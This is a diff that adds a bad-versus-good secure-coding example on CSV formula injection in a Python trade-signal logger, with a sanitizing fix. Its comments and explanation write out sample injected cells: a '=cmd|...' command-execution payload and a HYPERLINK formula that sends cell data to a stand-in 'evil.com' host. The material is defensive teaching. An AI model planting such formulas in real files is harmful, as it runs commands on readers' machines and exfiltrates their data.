@@ -4284,3 +4284,90 @@ class FixSession:
 ```
 
 **Разница:** The bad code uses `open('w')` which truncates the file to 0 bytes before writing. If the process crashes between `open` and `f.write` (SIGKILL, OOM, power loss), the file is empty. On restart, seq nums reset to 1, the exchange rejects all messages ("SeqNum too low"), and the FIX session cannot resume — all pending orders, open positions, and execution reports are lost. With 1000 users, a single OOM kill breaks 1000 FIX sessions, each requiring manual reset with the exchange, causing hours of downtime. The good code writes to a temp file in the same directory, calls `f.flush()` + `os.fsync()` to force the write to disk, then uses `os.replace()` (atomic on both POSIX and Windows) to swap the temp file with the real file. If the process crashes before `os.replace`, the old file is intact and the session resumes normally. If it crashes during `os.replace`, the atomic rename ensures either the old or new file exists — never an empty file. The cost is ~10 extra lines (temp file, fsync, replace, cleanup). The benefit is zero seq num corruption on crash — the FIX session always resumes with correct sequence numbers, even after SIGKILL or power loss.
+
+---
+
+## Bad vs Good: CSV Injection in Trade Logger (Python)
+
+### ❌ Bad Code
+```python
+import csv
+
+class SignalLogger:
+    def log(self, signal_dict: dict) -> None:
+        with open(self.path, "a", encoding="utf-8", newline="") as f:
+            writer = csv.writer(f)
+            writer.writerow([
+                signal_dict.get('timestamp', ''),
+                signal_dict['symbol'],       # From exchange feed
+                signal_dict['direction'],
+                signal_dict['confidence'],
+                signal_dict['strategy'],
+                signal_dict['entry_price'],
+                signal_dict['stop_loss'],
+                signal_dict['take_profit'],
+                f"{signal_dict.get('rr_ratio', 0):.2f}",
+                signal_dict.get('reason', ''),  # From LLM engine
+            ])
+
+# Attacker compromises exchange feed or LLM:
+# signal_dict['symbol'] = "=cmd|'/c calc'!A1"
+# signal_dict['reason'] = "=HYPERLINK(\"http://evil.com/?data=\"&A1:B100)"
+#
+# CSV file contains:
+# 1704067200,=cmd|'/c calc'!A1,LONG,85,trend,65000,63700,67600,1.50,=HYPERLINK(...)
+#
+# Analyst opens CSV in Excel → formula executes:
+# - =cmd|'/c calc'!A1 → executes calc.exe (arbitrary command execution)
+# - =HYPERLINK(...) → sends cell data to attacker's server (data exfiltration)
+# - With 1000 users, one analyst opening the CSV = full data breach
+```
+
+**What's wrong:**
+- `csv.writer` writes values as-is — no sanitization
+- If `symbol` or `reason` starts with `=`, `+`, `-`, or `@`, Excel interprets it as a formula
+- `=cmd|'/c calc'!A1` executes arbitrary commands on the analyst's machine
+- `=HYPERLINK("http://evil.com/?data="&A1:B100)` exfiltrates all data in the CSV to an attacker's server
+- The `reason` field comes from the LLM engine, which processes external market data — an attacker can craft market events that cause the LLM to output formula-like text
+- With 1000 users, one analyst opening the CSV in Excel triggers command execution or data exfiltration on their machine — full compromise of the trading desk
+
+### ✅ Good Code
+```python
+import csv
+import re
+
+def sanitize_csv_cell(value: str) -> str:
+    """Sanitize a CSV cell to prevent formula injection."""
+    if not isinstance(value, str):
+        value = str(value)
+    # Prefix dangerous characters with a single quote
+    # Excel treats leading ' as text indicator, not displayed
+    if value and value[0] in ('=', '+', '-', '@', '\t', '\r', '\n'):
+        return f"'{value}"
+    return value
+
+class SignalLogger:
+    def log(self, signal_dict: dict) -> None:
+        with open(self.path, "a", encoding="utf-8", newline="") as f:
+            writer = csv.writer(f, quoting=csv.QUOTE_MINIMAL)
+            writer.writerow([
+                sanitize_csv_cell(str(signal_dict.get('timestamp', ''))),
+                sanitize_csv_cell(signal_dict['symbol']),
+                sanitize_csv_cell(signal_dict['direction']),
+                sanitize_csv_cell(str(signal_dict['confidence'])),
+                sanitize_csv_cell(signal_dict['strategy']),
+                sanitize_csv_cell(str(signal_dict['entry_price'])),
+                sanitize_csv_cell(str(signal_dict['stop_loss'])),
+                sanitize_csv_cell(str(signal_dict['take_profit'])),
+                sanitize_csv_cell(f"{signal_dict.get('rr_ratio', 0):.2f}"),
+                sanitize_csv_cell(signal_dict.get('reason', '')),
+            ])
+
+# CSV file now contains:
+# 1704067200,'=cmd|'/c calc'!A1,LONG,85,trend,65000,63700,67600,1.50,'=HYPERLINK(...)
+#
+# Excel displays: =cmd|'/c calc'!A1 (as text, not formula)
+# No command execution, no data exfiltration
+```
+
+**Разница:** The bad code writes values from the signal dict directly to CSV without sanitization. If `symbol` or `reason` starts with `=`, `+`, `-`, or `@`, Excel interprets the cell as a formula. An attacker who compromises the exchange feed or crafts market events that influence the LLM engine can inject formulas like `=cmd|'/c calc'!A1` (command execution) or `=HYPERLINK("http://evil.com/?data="&A1:B100)` (data exfiltration). With 1000 users, one analyst opening the CSV in Excel triggers the formula — full compromise of the trading desk. The good code adds a `sanitize_csv_cell()` function that prefixes dangerous characters (`=`, `+`, `-`, `@`, tab, CR, LF) with a single quote `'`. Excel treats a leading `'` as a text indicator — the cell is displayed as text, not interpreted as a formula. The cost is a ~5-line sanitize function and one extra call per cell. The benefit is zero formula injection — even if an attacker injects `=cmd|...` into the signal data, Excel displays it as harmless text. The analyst sees the malicious string and can investigate, but no code executes on their machine.
